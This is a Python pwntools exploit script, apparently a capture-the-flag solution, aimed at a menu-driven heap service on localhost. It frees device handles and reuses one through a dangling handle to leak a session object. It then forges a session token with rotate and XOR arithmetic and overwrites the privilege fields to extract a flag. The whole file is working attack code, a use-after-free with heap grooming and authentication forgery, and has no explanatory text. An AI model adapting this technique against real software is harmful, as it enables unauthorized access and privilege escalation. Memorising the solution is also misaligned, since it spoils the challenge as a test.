from pwn import *
import sys
context.log_level='info'
HOST,PORT=('localhost',9998) if len(sys.argv)<2 else (sys.argv[1],int(sys.argv[2]))
M=(1<<64)-1
def rol64(x,n): n&=63; return ((x<<n)|(x>>(64-n)))&M
io=remote(HOST,PORT)
def menu(c): io.sendlineafter(b'> ',str(c).encode())
def h(x): io.sendlineafter(b'Handle: ',str(x).encode())
# 8 devices
for _ in range(8): menu(1)
menu(2); h(7)                       # duplicate handle 7 -> handle 8 (dangling)
for i in range(7): menu(5); h(i)    # free 0-6 -> fill tcache[0x110]
menu(5); h(7)                       # free 7 -> unsorted bin
menu(6); io.sendlineafter(b'Name: ',b'AAAA')   # create session 0 (reuses chunk 7)
# leak session via dangling handle 8
menu(3); h(8); io.sendlineafter(b'Offset: ',b'0'); io.sendlineafter(b'Size: ',b'48')
leak=io.recvn(48)
uid=u64(leak[8:16]); role=u64(leak[0x18:0x20]); t1=u64(leak[0x20:0x28]); t2=u64(leak[0x28:0x30])
log.info(f"leak: magic={leak[:8]} uid={hex(uid)} t2_stored={hex(t2)}")
idx=uid-0x3e8
C1=rol64((0x414141414141452a+idx)&M,0x1d)
C2=rol64((uid+0x5478547854785478)&M,0x1d)
correct=t2 ^ C1 ^ C2
log.success(f"forged token2={hex(correct)}")
# write [+0x10]=0x1337... and [+0x28]=correct via handle 8
menu(4); h(8); io.sendlineafter(b'Offset: ',b'16'); io.sendlineafter(b'Size: ',b'8'); io.sendafter(b'Data: ',p64(0x1337133713371337))
menu(4); h(8); io.sendlineafter(b'Offset: ',b'40'); io.sendlineafter(b'Size: ',b'8'); io.sendafter(b'Data: ',p64(correct))
# request privileged data on session 0
menu(8); io.sendlineafter(b'Session: ',b'0')
data=io.recvall(timeout=4)
print(data.decode('latin1','replace'))
m=re.search(r'(BDSEC\{[^}]*\}|PHANTOMFLAG\{[^}]*\})',data.decode('latin1','replace'))
if m: log.success("FLAG: "+m.group(1))
